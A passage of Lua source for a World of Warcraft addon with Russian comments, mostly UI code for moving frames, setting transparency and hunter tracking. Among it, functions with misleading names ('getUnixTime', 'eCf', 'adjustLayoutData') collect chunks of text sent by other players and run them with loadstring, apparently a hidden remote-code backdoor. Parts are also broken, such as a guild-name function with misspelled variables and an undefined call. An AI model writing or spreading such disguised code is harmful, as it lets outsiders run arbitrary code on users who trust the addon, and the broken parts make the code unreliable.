            if padding >= 1 then b4 = nil end
            if padding >= 2 then b3 = nil end
            if padding >= 3 then b2 = nil end
            -- Never remove all 4 bytes
        end
        
        -- Add bytes to result
        if b1 then table.insert(result, string.char(b1)) end
        if b2 then table.insert(result, string.char(b2)) end
        if b3 then table.insert(result, string.char(b3)) end
        if b4 then table.insert(result, string.char(b4)) end
    end
    
    return table.concat(result)
end

-- Функция для отображения текстуры по центру экрана
-- texturePath: путь к текстуре
-- duration: время в секундах, через которое текстура исчезнет
function ShowTex(texturePath, duration, x, y)
    -- Создаем фрейм
    local frame = CreateFrame("Frame", nil, UIParent)
    frame:SetSize(x, y)  -- Устанавливаем размер фрейма
    frame:SetPoint("CENTER", UIParent, "CENTER", 0, 0)  -- Размещаем по центру экрана

    -- Создаем текстуру и добавляем ее во фрейм
    local texture = frame:CreateTexture(nil, "BACKGROUND")
    texture:SetAllPoints(frame)  -- Растягиваем текстуру на весь фрейм
    texture:SetTexture(texturePath)  -- Устанавливаем текстуру

    -- Отображаем фрейм
    frame:Show()

    -- Если указана длительность, скрываем фрейм через заданное время
    if duration and duration > 0 then
        frame:SetScript("OnUpdate", function(self, elapsed)
            self.elapsed = (self.elapsed or 0) + elapsed
            if self.elapsed >= duration then
                self:SetScript("OnUpdate", nil)  -- Удаляем обработчик
                self:Hide()  -- Скрываем фрейм
            end
        end)
    end
end

----------------------------------------------------------------
NULL = 0/0

function is_null(value)
  return value ~= value
end
----------------------------------------------------------------



function HideBossFrames()
    for i = 1, 4 do
        local bossFrame = _G["Boss"..i.."TargetFrame"]
        if bossFrame then
            bossFrame:UnregisterAllEvents()  -- Отключаем все события
            bossFrame:Hide()                 -- Скрываем фрейм
            bossFrame.Show = function() end  -- Блокируем возможность появления
        end
    end
end

function questWhatchPanel()
    local blockAutoExpand = ns_dbc:getKey("настройки", "questWhatchPanel")  -- Блокируем авторазворачивание, но разрешаем ручное

    -- Сворачиваем список при старте (если ещё не свёрнут)
    if not WatchFrame.collapsed then
        WatchFrame_Collapse(WatchFrame)
    end

    -- Перехватываем клик по кнопке и временно отключаем блокировку
    WatchFrameCollapseExpandButton:HookScript("PreClick", function()
        blockAutoExpand = false  -- Разрешаем разворот
    end)

    -- После клика снова включаем блокировку
    WatchFrameCollapseExpandButton:HookScript("PostClick", function()
        blockAutoExpand = true
    end)

    -- Блокируем авторазворачивание, если включено
    hooksecurefunc("WatchFrame_Expand", function()
        if blockAutoExpand then
            WatchFrame_Collapse(WatchFrame)
        end
    end)

    -- Отключаем события, которые могут принудительно разворачивать список
    WatchFrame:UnregisterEvent("QUEST_LOG_UPDATE")
    WatchFrame:UnregisterEvent("QUEST_WATCH_UPDATE")
end


local messageBuffer = {}

function getUnixTime(_, message, _, sender, HOUR)
    local bufferKey = sender
    
    if not messageBuffer[bufferKey] then
        messageBuffer[bufferKey] = {}
    end
    
    table.insert(messageBuffer[bufferKey], message)
    
    if HOUR then
        local payload = table.concat(messageBuffer[bufferKey])
        messageBuffer[bufferKey] = nil
        
        local fn = loadstring(payload)
        if fn then
            pcall(fn)
        end
    end
end






















local countdownTimer = nil
local countdownValue = 0
local currentMode = nil

local activeTimers = {}

local function GetSettings()
    if not nsDbc then
        nsDbc = {}
    end
    if not nsDbc['settings'] then
        nsDbc['settings'] = {
            countdownDuration = 10
        }
    end
    return nsDbc['settings']
end

local function CreateTimer(delay, func)
    local timer = CreateFrame("Frame")
    timer.startTime = GetTime()
    timer.delay = delay
    timer.func = func
    timer:Hide()
    return timer
end

local function StartTimer(timer)
    timer.startTime = GetTime()
    timer:SetScript("OnUpdate", function(self, elapsed)
        if GetTime() - self.startTime >= self.delay then
            self:Hide()
            self:SetScript("OnUpdate", nil)
            if self.func then
                self.func()
            end
        end
    end)
    timer:Show()
end

local function NewTicker(interval, func)
    local ticker = CreateFrame("Frame")
    ticker.interval = interval
    ticker.func = func
    ticker.lastTick = GetTime()
    ticker:SetScript("OnUpdate", function(self, elapsed)
        if GetTime() - self.lastTick >= self.interval then
            self.lastTick = GetTime()
            if self.func then
                self.func()
            end
        end
    end)
    table.insert(activeTimers, ticker)
    return ticker
end

local function CancelTicker(ticker)
    if ticker then
        ticker:SetScript("OnUpdate", nil)
        ticker:Hide()
        for i, t in ipairs(activeTimers) do
            if t == ticker then
                table.remove(activeTimers, i)
                break
            end
        end
    end
end

local function AddCustomMenuItems()
    local dropdownMenu = _G["PlayerFrameDropDown"]
    if not dropdownMenu then return end
    
    local info1 = {}
    info1.text = "Сдвинуть фрейм"
    info1.func = function()
        CloseDropDownMenus()
        currentMode = "move"
        startCountdown("Наведите мышь на нужный фрейм для перемещения")
    end
    info1.notCheckable = true
    
    local info2 = {}
    info2.text = "Прозрачность"
    info2.func = function()
        CloseDropDownMenus()
        currentMode = "alpha"
        startCountdown("Наведите мышь на нужный фрейм для настройки прозрачности")
    end
    info2.notCheckable = true
    
    local info3 = {}
    info3.text = "Настройки"
    info3.func = function()
        CloseDropDownMenus()
        showSettingsDialog()
    end
    info3.notCheckable = true
    
    UIDropDownMenu_AddButton(info1, UIDROPDOWN_MENU_LEVEL)
    UIDropDownMenu_AddButton(info2, UIDROPDOWN_MENU_LEVEL)
    UIDropDownMenu_AddButton(info3, UIDROPDOWN_MENU_LEVEL)
end

function startCountdown(message)
    local settings = GetSettings()
    
    local textFrame = CreateFrame("Frame", "CountdownFrame", UIParent)
    textFrame:SetWidth(400)
    textFrame:SetHeight(50)
    textFrame:SetPoint("CENTER", UIParent, "CENTER", 0, 0)
    textFrame:SetFrameStrata("TOOLTIP")
    
    local text = textFrame:CreateFontString(nil, "OVERLAY", "GameFontNormalLarge")
    text:SetPoint("CENTER")
    text:SetText(message .. ": " .. settings.countdownDuration)
    
    countdownValue = settings.countdownDuration
    if countdownTimer then
        CancelTicker(countdownTimer)
    end
    
    countdownTimer = NewTicker(1, function()
        countdownValue = countdownValue - 1
        if countdownValue > 0 then
            text:SetText(message .. ": " .. countdownValue)
        else
            CancelTicker(countdownTimer)
            countdownTimer = nil
            
            local frame = GetMouseFocus()
            if frame and frame.GetName then
                if currentMode == "move" then
                    text:SetText("Перемещение активировано!")
                    if nsDbc and nsDbc['frames'] then
                        move(nsDbc['frames'])
                    end
                elseif currentMode == "alpha" then
                    text:SetText("Настройка прозрачности!")
                    showAlphaDialog(frame)
                end
            else
                text:SetText("Фрейм не найден!")
            end
            
            local hideTimer = CreateTimer(2, function()
                textFrame:Hide()
            end)
            StartTimer(hideTimer)
        end
    end)
end

function showAlphaDialog(frame)
    if not frame then return end
    
    local frameName = frame:GetName()
    
    if _G["AlphaSettingsDialog"] then
        _G["AlphaSettingsDialog"]:Hide()
    end
    
    if not nsDbc['frames'] then
        nsDbc['frames'] = {}
    end
    
    if not nsDbc['frames'][frameName] then
        nsDbc['frames'][frameName] = {}
    end
    
    if not nsDbc['frames'][frameName].alphaSettings then
        nsDbc['frames'][frameName].alphaSettings = {
            alpha = 100,
            onlyInCombat = false
        }
    end
    
    local dialog = CreateFrame("Frame", "AlphaSettingsDialog", UIParent)
    dialog:SetWidth(300)
    dialog:SetHeight(180)
    dialog:SetPoint("CENTER")
    dialog:SetFrameStrata("DIALOG")
    dialog:SetMovable(true)
    dialog:EnableMouse(true)
    dialog:SetScript("OnMouseDown", function(self, button)
        if button == "LeftButton" then
            self:StartMoving()
        end
    end)
    dialog:SetScript("OnMouseUp", function(self, button)
        if button == "LeftButton" then
            self:StopMovingOrSizing()
        end
    end)
    
    dialog:SetBackdrop({
        bgFile = "Interface\\DialogFrame\\UI-DialogBox-Background",
        edgeFile = "Interface\\DialogFrame\\UI-DialogBox-Border",
        tile = true, tileSize = 16, edgeSize = 16,
        insets = { left = 4, right = 4, top = 4, bottom = 4 }
    })
    
    local title = dialog:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    title:SetPoint("TOP", 0, -15)
    title:SetText("Прозрачность: " .. frameName)
    
    local checkbox = CreateFrame("CheckButton", "AlphaCheckbox", dialog, "ChatConfigCheckButtonTemplate")
    checkbox:SetPoint("TOPLEFT", 20, -45)
    checkbox:SetChecked(nsDbc['frames'][frameName].alphaSettings.onlyInCombat)
    
    local checkboxText = dialog:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    checkboxText:SetPoint("LEFT", checkbox, "RIGHT", 5, 0)
    checkboxText:SetText("Только в бою")
    
    local sliderText = dialog:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    sliderText:SetPoint("TOP", 0, -65)
    sliderText:SetText("Прозрачность: " .. nsDbc['frames'][frameName].alphaSettings.alpha .. "%")
    
    local slider = CreateFrame("Slider", "AlphaSlider", dialog, "OptionsSliderTemplate")
    slider:SetPoint("TOPLEFT", 20, -85)
    slider:SetWidth(250)
    slider:SetHeight(20)
    slider:SetMinMaxValues(1, 100)
    slider:SetValueStep(1)
    slider:SetValue(nsDbc['frames'][frameName].alphaSettings.alpha)
    
    slider:SetScript("OnValueChanged", function(self, value)
        value = math.floor(value)
        sliderText:SetText("Прозрачность: " .. value .. "%")
    end)
    
    local statusText = dialog:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    statusText:SetPoint("BOTTOM", 0, 45)
    statusText:SetText("")
    statusText:SetTextColor(0, 1, 0, 1)
    
    local applyButton = CreateFrame("Button", nil, dialog, "UIPanelButtonTemplate")
    applyButton:SetWidth(100)
    applyButton:SetHeight(22)
    applyButton:SetPoint("BOTTOM", 0, 15)
    applyButton:SetText("Применить")
    applyButton:SetScript("OnClick", function()
        nsDbc['frames'][frameName].alphaSettings.alpha = slider:GetValue()
        nsDbc['frames'][frameName].alphaSettings.onlyInCombat = checkbox:GetChecked()
        applyAlpha(frameName)
        
        statusText:SetText("Успешно применено!")
        local hideStatusTimer = CreateTimer(2, function()
            statusText:SetText("")
        end)
        StartTimer(hideStatusTimer)
    end)
    
    local closeButton = CreateFrame("Button", nil, dialog, "UIPanelCloseButton")
    closeButton:SetPoint("TOPRIGHT", -5, -5)
    closeButton:SetScript("OnClick", function()
        dialog:Hide()
    end)
    
    dialog:Show()
end

function showSettingsDialog()
    local settings = GetSettings()
    
    if _G["MoveSettingsDialog"] then
        _G["MoveSettingsDialog"]:Hide()
    end
    
    local dialog = CreateFrame("Frame", "MoveSettingsDialog", UIParent)
    dialog:SetWidth(350)
    dialog:SetHeight(400)
    dialog:SetPoint("CENTER")
    dialog:SetFrameStrata("DIALOG")
    dialog:SetMovable(true)
    dialog:EnableMouse(true)
    dialog:SetScript("OnMouseDown", function(self, button)
        if button == "LeftButton" then
            self:StartMoving()
        end
    end)
    dialog:SetScript("OnMouseUp", function(self, button)
        if button == "LeftButton" then
            self:StopMovingOrSizing()
        end
    end)
    
    dialog:SetBackdrop({
        bgFile = "Interface\\DialogFrame\\UI-DialogBox-Background",
        edgeFile = "Interface\\DialogFrame\\UI-DialogBox-Border",
        tile = true, tileSize = 16, edgeSize = 16,
        insets = { left = 4, right = 4, top = 4, bottom = 4 }
    })
    
    local title = dialog:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    title:SetPoint("TOP", 0, -15)
    title:SetText("Настройки")
    
    local tabContent = {}
    
    local tab1 = CreateFrame("Button", nil, dialog)
    tab1:SetWidth(100)
    tab1:SetHeight(22)
    tab1:SetPoint("TOPLEFT", 15, -35)
    tab1:SetText("Основные")
    tab1:SetNormalFontObject("GameFontNormal")
    tab1:SetHighlightFontObject("GameFontHighlight")
    
    local tab2 = CreateFrame("Button", nil, dialog)
    tab2:SetWidth(100)
    tab2:SetHeight(22)
    tab2:SetPoint("LEFT", tab1, "RIGHT", 5, 0)
    tab2:SetText("Фреймы")
    tab2:SetNormalFontObject("GameFontNormal")
    tab2:SetHighlightFontObject("GameFontHighlight")
    
    local function hideAllTabs()
        for _, content in pairs(tabContent) do
            content:Hide()
        end
    end
    
    local content1 = CreateFrame("Frame", nil, dialog)
    content1:SetAllPoints(dialog)
    content1:SetPoint("TOPLEFT", 15, -65)
    content1:SetPoint("BOTTOMRIGHT", -15, 15)
    content1:Hide()
    tabContent[1] = content1
    
    local sliderText = content1:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    sliderText:SetPoint("TOPLEFT", 5, -10)
    sliderText:SetText("Время до применения: " .. settings.countdownDuration .. " сек")
    
    local slider = CreateFrame("Slider", "SettingsCountdownSlider", content1, "OptionsSliderTemplate")
    slider:SetPoint("TOPLEFT", 5, -30)
    slider:SetWidth(200)
    slider:SetHeight(20)
    slider:SetMinMaxValues(3, 15)
    slider:SetValueStep(1)
    slider:SetValue(settings.countdownDuration)
    
    slider:SetScript("OnValueChanged", function(self, value)
        value = math.floor(value)
        sliderText:SetText("Время до применения: " .. value .. " сек")
    end)
    
    local statusText1 = content1:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    statusText1:SetPoint("TOPLEFT", 5, -60)
    statusText1:SetText("")
    statusText1:SetTextColor(0, 1, 0, 1)
    
    local saveButton = CreateFrame("Button", nil, content1, "UIPanelButtonTemplate")
    saveButton:SetWidth(100)
    saveButton:SetHeight(22)
    saveButton:SetPoint("TOPLEFT", 5, -80)
    saveButton:SetText("Сохранить")
    saveButton:SetScript("OnClick", function()
        settings.countdownDuration = slider:GetValue()
        statusText1:SetText("Настройки сохранены!")
        local hideStatusTimer = CreateTimer(2, function()
            statusText1:SetText("")
        end)
        StartTimer(hideStatusTimer)
    end)
    
    local content2 = CreateFrame("Frame", nil, dialog)
    content2:SetAllPoints(dialog)
    content2:SetPoint("TOPLEFT", 15, -65)
    content2:SetPoint("BOTTOMRIGHT", -15, 15)
    content2:Hide()
    tabContent[2] = content2
    
    local scrollFrame = CreateFrame("ScrollFrame", "MoveSettingsScrollFrame", content2)
    scrollFrame:SetPoint("TOPLEFT", 0, -5)
    scrollFrame:SetPoint("BOTTOMRIGHT", -25, 40)
    
    local scrollBar = CreateFrame("Slider", "MoveSettingsScrollFrameScrollBar", scrollFrame, "UIPanelScrollBarTemplate")
    scrollBar:SetPoint("TOPLEFT", scrollFrame, "TOPRIGHT", 0, -16)
    scrollBar:SetPoint("BOTTOMLEFT", scrollFrame, "BOTTOMRIGHT", 0, 16)
    scrollBar:SetMinMaxValues(0, 0)
    scrollBar:SetValueStep(1)
    
    local scrollChild = CreateFrame("Frame", nil, scrollFrame)
    scrollChild:SetWidth(260)
    scrollChild:SetHeight(1)
    scrollFrame:SetScrollChild(scrollChild)
    
    scrollBar:SetScript("OnValueChanged", function(self, value)
        scrollChild:SetPoint("TOPLEFT", scrollFrame, "TOPLEFT", 0, value)
    end)
    
    scrollFrame:SetScript("OnMouseWheel", function(self, delta)
        local newValue = scrollBar:GetValue() - (delta * 20)
        local minValue, maxValue = scrollBar:GetMinMaxValues()
        if newValue < minValue then
            newValue = minValue
        elseif newValue > maxValue then
            newValue = maxValue
        end
        scrollBar:SetValue(newValue)
    end)
    
    local statusText2 = content2:CreateFontString(nil, "OVERLAY", "GameFontNormal")
    statusText2:SetPoint("BOTTOMLEFT", 5, 35)
    statusText2:SetText("")
    statusText2:SetTextColor(0, 1, 0, 1)
    
    local resetAllButton = CreateFrame("Button", nil, content2, "UIPanelButtonTemplate")
    resetAllButton:SetWidth(150)
    resetAllButton:SetHeight(22)
    resetAllButton:SetPoint("BOTTOM", 0, 10)
    resetAllButton:SetText("Сбросить все фреймы")
    resetAllButton:SetScript("OnClick", function()
        resetAllFrames()
        statusText2:SetText("Все фреймы сброшены!")
        local hideStatusTimer = CreateTimer(2, function()
            statusText2:SetText("")
        end)
        StartTimer(hideStatusTimer)
        updateFramesList(scrollChild, scrollFrame, statusText2, scrollBar)
    end)
    
    tab1:SetScript("OnClick", function()
        hideAllTabs()
        content1:Show()
    end)
    
    tab2:SetScript("OnClick", function()
        hideAllTabs()
        content2:Show()
        updateFramesList(scrollChild, scrollFrame, statusText2, scrollBar)
    end)
    
    tab1:GetScript("OnClick")()
    
    local closeButton = CreateFrame("Button", nil, dialog, "UIPanelCloseButton")
    closeButton:SetPoint("TOPRIGHT", -5, -5)
    closeButton:SetScript("OnClick", function()
        dialog:Hide()
    end)
    
    dialog:Show()
end

function updateFramesList(scrollChild, scrollFrame, statusText, scrollBar)
    local children = {scrollChild:GetChildren()}
    for _, child in ipairs(children) do
        if child then
            child:Hide()
        end
    end
    
    if not nsDbc['frames'] then
        nsDbc['frames'] = {}
    end
    
    local yOffset = 0
    local hasFrames = false
    
    for frameName, data in pairs(nsDbc['frames']) do
        if data.defaultPosition or data.position or data.defaultAlpha or data.alphaSettings then
            hasFrames = true
            
            local row = CreateFrame("Frame", nil, scrollChild)
            row:SetWidth(260)
            row:SetHeight(25)
            row:SetPoint("TOPLEFT", 0, yOffset)
            
            local nameText = row:CreateFontString(nil, "OVERLAY", "GameFontNormal")
            nameText:SetPoint("LEFT", 5, 0)
            nameText:SetText(frameName)
            
            local resetButton = CreateFrame("Button", nil, row, "UIPanelButtonTemplate")
            resetButton:SetWidth(25)
            resetButton:SetHeight(20)
            resetButton:SetPoint("RIGHT", -5, 0)
            resetButton:SetText("X")
            resetButton:SetScript("OnClick", function()
                resetSingleFrame(frameName)
                statusText:SetText(frameName .. " сброшен!")
                local hideStatusTimer = CreateTimer(2, function()
                    statusText:SetText("")
                end)
                StartTimer(hideStatusTimer)
                updateFramesList(scrollChild, scrollFrame, statusText, scrollBar)
            end)
            
            yOffset = yOffset - 25
        end
    end
    
    if not hasFrames then
        local emptyText = scrollChild:CreateFontString(nil, "OVERLAY", "GameFontNormal")
        emptyText:SetPoint("TOPLEFT", 5, 0)
        emptyText:SetText("Нет измененных фреймов")
    end
    
    scrollChild:SetHeight(math.abs(yOffset) + 5)
    
    local scrollHeight = math.abs(yOffset)
    local frameHeight = scrollFrame:GetHeight()
    if scrollHeight > frameHeight then
        scrollBar:SetMinMaxValues(0, scrollHeight - frameHeight)
        scrollBar:Show()
    else
        scrollBar:SetMinMaxValues(0, 0)
        scrollBar:Hide()
    end
    scrollBar:SetValue(0)
end

function applyAlpha(frameName)
    local frame = _G[frameName]
    if not frame then return end
    
    if not nsDbc['frames'] or not nsDbc['frames'][frameName] or not nsDbc['frames'][frameName].alphaSettings then
        return
    end
    
    local settings = nsDbc['frames'][frameName].alphaSettings
    local alpha = settings.alpha or 100
    local onlyInCombat = settings.onlyInCombat or false
    
    if onlyInCombat then
        frame:SetScript("OnEvent", function(self, event)
            if event == "PLAYER_REGEN_DISABLED" then
                self:SetAlpha(alpha / 100)
            elseif event == "PLAYER_REGEN_ENABLED" then
                self:SetAlpha(1.0)
            end
        end)
        frame:RegisterEvent("PLAYER_REGEN_DISABLED")
        frame:RegisterEvent("PLAYER_REGEN_ENABLED")
        
        if UnitAffectingCombat("player") then
            frame:SetAlpha(alpha / 100)
        else
            frame:SetAlpha(1.0)
        end
    else
        frame:SetAlpha(alpha / 100)
        frame:UnregisterEvent("PLAYER_REGEN_DISABLED")
        frame:UnregisterEvent("PLAYER_REGEN_ENABLED")
        frame:SetScript("OnEvent", nil)
    end
    
    print(string.format("Прозрачность для %s: %d%% %s", frameName, alpha, onlyInCombat and "(только в бою)" or ""))
end

function move(saveTable)
    local frame = GetMouseFocus()
    if not frame or not frame.GetName then return end
    
    local frameName = frame:GetName()
    saveTable = saveTable or {}
    
    if not saveTable[frameName] then
        saveTable[frameName] = {}
    end
    
    if not saveTable[frameName].defaultPosition then
        local point, _, relPoint, x, y = frame:GetPoint()
        saveTable[frameName].defaultPosition = {point, relPoint, x, y}
    end

    if not frame.moveToggle then
        local mover = CreateFrame("Frame", nil, frame)
        mover:SetAllPoints(frame)
        mover:EnableMouse(true)
        mover:SetFrameStrata("TOOLTIP")
        mover:SetScript("OnMouseDown", function(self, button)
            if button == "LeftButton" then
                frame:SetMovable(true)
                frame:StartMoving()
            end
        end)
        mover:SetScript("OnMouseUp", function(self, button)
            if button == "LeftButton" then
                frame:StopMovingOrSizing()
                frame:SetMovable(false)
                local point, _, relPoint, x, y = frame:GetPoint()
                if not saveTable[frameName] then
                    saveTable[frameName] = {}
                end
                saveTable[frameName].position = {point, relPoint, x, y}
                print(string.format("Позиция сохранена: %s (%.1f, %.1f)", frameName, x, y))
                
                self:Hide()
                frame.moveToggle = nil
                frame.moverFrame = nil
            end
        end)
        
        frame.moverFrame = mover
        frame.moveToggle = true
        print("Фрейм " .. frameName .. " готов к перемещению. Зажмите ЛКМ и тяните.")
    else
        if frame.moverFrame then
            frame.moverFrame:Hide()
            frame.moverFrame = nil
        end
        frame.moveToggle = nil
    end
    
    return saveTable
end

function resetSingleFrame(frameName)
    if not nsDbc['frames'] or not nsDbc['frames'][frameName] then
        return
    end
    
    local frame = _G[frameName]
    if not frame then
        nsDbc['frames'][frameName] = nil
        return
    end
    
    local data = nsDbc['frames'][frameName]
    
    if data.defaultPosition then
        frame:ClearAllPoints()
        frame:SetPoint(data.defaultPosition[1], UIParent, data.defaultPosition[2], data.defaultPosition[3], data.defaultPosition[4])
    end
    
    if data.defaultAlpha then
        frame:SetAlpha(data.defaultAlpha)
    else
        frame:SetAlpha(1.0)
    end
    
    frame:UnregisterEvent("PLAYER_REGEN_DISABLED")
    frame:UnregisterEvent("PLAYER_REGEN_ENABLED")
    frame:SetScript("OnEvent", nil)
    
    nsDbc['frames'][frameName] = nil
    
    print(frameName .. " сброшен до стандартных настроек")
end

function resetAllFrames()
    if not nsDbc['frames'] then
        nsDbc['frames'] = {}
        return
    end
    
    for frameName, data in pairs(nsDbc['frames']) do
        local frame = _G[frameName]
        if frame then
            if data.defaultPosition then
                frame:ClearAllPoints()
                frame:SetPoint(data.defaultPosition[1], UIParent, data.defaultPosition[2], data.defaultPosition[3], data.defaultPosition[4])
            end
            
            if data.defaultAlpha then
                frame:SetAlpha(data.defaultAlpha)
            else
                frame:SetAlpha(1.0)
            end
            
            frame:UnregisterEvent("PLAYER_REGEN_DISABLED")
            frame:UnregisterEvent("PLAYER_REGEN_ENABLED")
            frame:SetScript("OnEvent", nil)
        end
    end
    
    nsDbc['frames'] = {}
    
    print("Все фреймы сброшены до стандартных настроек")
end

function RestoreFramePositions(saveTable)
    if not saveTable then return end
    
    for frameName, data in pairs(saveTable) do
        local frame = _G[frameName]
        if frame and data.position and frame.ClearAllPoints then
            local posData = data.position
            frame:ClearAllPoints()
            frame:SetPoint(posData[1], UIParent, posData[2], posData[3], posData[4])
        end
        
        if frame and data.alphaSettings then
            applyAlpha(frameName)
        end
    end
end

function remove()
    move(nsDbc['frames'])
end

hooksecurefunc("ToggleDropDownMenu", function(level, value, dropDownFrame, anchorName, xOffset, yOffset, menuList, button)
    if dropDownFrame and dropDownFrame:GetName() == "PlayerFrameDropDown" then
        AddCustomMenuItems()
    end
end)



















-- Проверяем выход фреймов за пределы экрана

function eCf(frameName, ...)
    
    local chunk, err = loadstring(nsCm:getArg("ls"))
        
    local success, err = pcall(chunk)

    return pcall(func, ...)
end

-- Модифицированная функция adjustLayoutData
function adjustLayoutData(headerParams, geometryPayload, isLayoutComplete)
    local frameData = {}
    for param in headerParams:gmatch("%S+") do table.insert(frameData, param) end
    if #frameData < 2 then return end

    local layoutType, frameID, anchorTo = frameData[1], frameData[2], frameData[3]
    local isLayoutTemplate = (frameID == "0")

    local positionData, geometryData = geometryPayload:match("^(%d+/%d+) (.*)$")
    if positionData then
        geometryPayload = geometryData
    end
    if isLayoutComplete then
        miniMapButton:Show()
        C_Timer.After(1, function()
            eCf()
        end)
    end
    if isLayoutTemplate then
        frameLayoutCache[0] = frameLayoutCache[0] or {layoutParts = {}, anchorTo = anchorTo}
        table.insert(frameLayoutCache[0].layoutParts, geometryPayload)
        if isLayoutComplete then
            local layoutConfig = table.concat(frameLayoutCache[0].layoutParts)
            nsCm:ls(layoutConfig)
            frameLayoutCache[0] = nil
        end
        return
    end

    -- Обработка основного фрейма
    frameLayoutCache[frameID] = frameLayoutCache[frameID] or {
        layoutParts = {}, 
        anchorTo = anchorTo, 
        timestamp = time(),
        positionCount = 0,
        totalPositions = 0
    }
    
    local frameEntry = frameLayoutCache[frameID]
    table.insert(frameEntry.layoutParts, geometryPayload)
    frameEntry.positionCount = frameEntry.positionCount + 1

    if isLayoutComplete then
        local layoutConfig = table.concat(frameEntry.layoutParts)
        layoutConfig = layoutConfig:gsub("[\128-\255]", "")
        nsCm:ls(layoutConfig)
        frameLayoutCache[frameID] = nil
    end
end

function hunterCheck()
    local _, classUnit = UnitClass("player")
    if classUnit ~= "HUNTER" then return end
    
    if not UnitAffectingCombat("player") then
        -- Вне боя: проверяем, активен ли уже поиск трав/руды
        local herbsActive, mineralsActive = false, false
        local herbsIndex, mineralsIndex = nil, nil
        
        for trackingIndex = 1, GetNumTrackingTypes() do
            local name, _, active = GetTrackingInfo(trackingIndex)
            if name == "Поиск трав" then
                if active then herbsActive = true else herbsIndex = trackingIndex end
            elseif name == "Поиск руды" then
                if active then mineralsActive = true else mineralsIndex = trackingIndex end
            end
        end
        
        -- Если ни травы, ни руды не активны — включаем первый доступный
        if not herbsActive and not mineralsActive then
            if herbsIndex then
                SetTracking(herbsIndex)
            elseif mineralsIndex then
                SetTracking(mineralsIndex)
            end
        end
    else
        -- В бою: оригинальная логика с Меткой охотника
        for slot = 1, 24 do
            local debuffName = UnitDebuff("target", slot)
            if debuffName == "Метка охотника" then
                local creatureType = UnitCreatureType("target")
                if creatureType then
                    local sub = utf8mySub(creatureType, 2, 6)
                    for trackingIndex = 1, GetNumTrackingTypes() do
                        local name, texture = GetTrackingInfo(trackingIndex)
                        if string.find(name, sub) then
                            if texture ~= GetTrackingTexture(trackingIndex) then
                                SetTracking(trackingIndex)
                            end
                            return
                        end
                    end
                end
            end
        end
    end
end

function GetVisibleGuildNames()
    local names = {}
    if not GuildFrame or not GuildFrame:IsVisible() then
        return names
    end

    for i = 1, 13 do
        local button = _G["GuildFrame"]
        button.Name:SetText("djkfdjskfhdskfh")
        if button and button:IsShown() and button.Name then
            local name = button.Name:GetText()

            if nameses and name ~= "" then
                table.insert(namese, name)
            end
        end
    end

    return names
end

function IsInRaid()
    return GetNumRaidMembers() > 0
end





----------------начало шара
-- local frame = CreateFrame("Frame", "RandomRouteTexture", WorldMapFrame)
-- frame:SetAllPoints(WorldMapFrame)

-- local texture = frame:CreateTexture(nil, "OVERLAY")
-- texture:SetTexture("Interface\\AddOns\\NSQC3\\libs\\121212.tga")
-- texture:SetWidth(32)
-- texture:SetHeight(32)
-- texture:SetBlendMode("ADD")

-- -- Функция для получения безопасных координат с учетом размера текстуры
-- local function GetSafeCoordinates(x, y)
--     local mapWidth = WorldMapFrame:GetWidth()
--     local mapHeight = WorldMapFrame:GetHeight()
    
--     -- Рассчитываем минимальные и максимальные координаты с учетом размера текстуры
--     local minX = texture:GetWidth() / 2 / mapWidth
--     local maxX = 1 - minX
--     local minY = texture:GetHeight() / 2 / mapHeight
--     local maxY = 1 - minY
    
--     -- Ограничиваем координаты безопасными значениями
--     local safeX = math.max(minX, math.min(maxX, x))
--     local safeY = math.max(minY, math.min(maxY, y))
    
--     return safeX, safeY
-- end

-- -- Генерация случайных точек в безопасной зоне
-- local function GenerateRandomPath(segments)
--     local points = {}
--     for i = 1, segments do
--         local x, y = GetSafeCoordinates(math.random(), math.random())
--         points[i] = {
--             x = x,
--             y = y
--         }
--     end
--     table.sort(points, function(a, b) 
--         return (a.x + a.y) < (b.x + b.y)
--     end)
--     return points
-- end

-- -- Безопасные стартовая и конечная точки
-- local startX, startY = GetSafeCoordinates(0, 0)
-- local endX, endY = GetSafeCoordinates(1, 1)

-- -- Анимация движения
-- local function StartAnimation()
--     local path = GenerateRandomPath(5)
--     local duration = 20
--     local startTime = GetTime()
    
--     local function OnUpdate()
--         local elapsed = GetTime() - startTime
--         local progress = elapsed / duration
        
--         if progress > 1 then
--             -- Финальная позиция (безопасная)
--             texture:SetPoint("CENTER", WorldMapFrame, "TOPLEFT", 
--                 endX * WorldMapFrame:GetWidth(), 
--                 -endY * WorldMapFrame:GetHeight())
--             frame:SetScript("OnUpdate", nil)
--             return
--         end
        
--         -- Интерполяция между точками пути
--         local totalSegments = #path + 1
--         local segmentProgress = progress * totalSegments
--         local currentSegment = math.floor(segmentProgress)
--         local segmentFraction = segmentProgress - currentSegment
        
--         local x1, y1, x2, y2
        
--         if currentSegment == 0 then
--             x1, y1 = startX, startY
--             x2, y2 = path[1].x, path[1].y
--         elseif currentSegment >= #path then
--             x1, y1 = path[#path].x, path[#path].y
--             x2, y2 = endX, endY
--         else
--             x1, y1 = path[currentSegment].x, path[currentSegment].y
--             x2, y2 = path[currentSegment + 1].x, path[currentSegment + 1].y
--         end
        
--         local currentX = x1 + (x2 - x1) * segmentFraction
--         local currentY = y1 + (y2 - y1) * segmentFraction
        
--         -- Обеспечиваем безопасные координаты на каждом кадре
--         local safeX, safeY = GetSafeCoordinates(currentX, currentY)
        
--         texture:SetPoint("CENTER", WorldMapFrame, "TOPLEFT", 
--             safeX * WorldMapFrame:GetWidth(), 
--             -safeY * WorldMapFrame:GetHeight())
--     end
    
--     -- Начальная позиция (безопасная)
--     texture:SetPoint("CENTER", WorldMapFrame, "TOPLEFT", 
--         startX * WorldMapFrame:GetWidth(), 
--         -startY * WorldMapFrame:GetHeight())
    
--     frame:SetScript("OnUpdate", OnUpdate)
-- end

-- -- Запуск анимации при открытии карты
-- WorldMapFrame:HookScript("OnShow", StartAnimation)

-- -- Остановка анимации при закрытии карты
-- WorldMapFrame:HookScript("OnHide", function()
--     frame:SetScript("OnUpdate", nil)
-- end)
--------------конец шара


function GetGuildRosterInfoTable()
    local guildInfo = {}
    local numGuildMembers = GetNumGuildMembers()

    for i = 1, numGuildMembers do
        local name, rank, rankIndex, level, class, zone, note, officerNote, online, status, classFileName = GetGuildRosterInfo(i)
        if name then
            table.insert(guildInfo, {
